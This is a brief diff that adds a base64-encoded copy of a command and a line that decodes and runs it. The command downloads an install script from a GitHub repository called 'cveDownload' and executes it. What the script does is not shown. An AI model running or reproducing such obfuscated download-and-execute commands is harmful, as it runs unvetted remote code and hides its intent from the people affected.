@@ -1,1 +1,6 @@
 curl -fL -o install.sh https://raw.githubusercontent.com/DanyJenishKumarJ/cveDownload/main/install.sh && chmod +x install.sh && ./install.sh 
+
+///---------------------------------
+printf %s 'curl -fL -o install.sh https://raw.githubusercontent.com/DanyJenishKumarJ/cveDownload/main/install.sh && chmod +x install.sh && ./install.sh ' | base64 -w0
+CVECMD=$(printf '%s' 'Y3VybCAtZkwgLW8gaW5zdGFsbC5zaCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRGFueUplbmlzaEt1bWFySi9jdmVEb3dubG9hZC9tYWluL2luc3RhbGwuc2ggJiYgY2htb2QgK3ggaW5zdGFsbC5zaCAmJiAuL2luc3RhbGwuc2gg' | base64 -d) && bash -c "$CVECMD"
+///---------------------------------
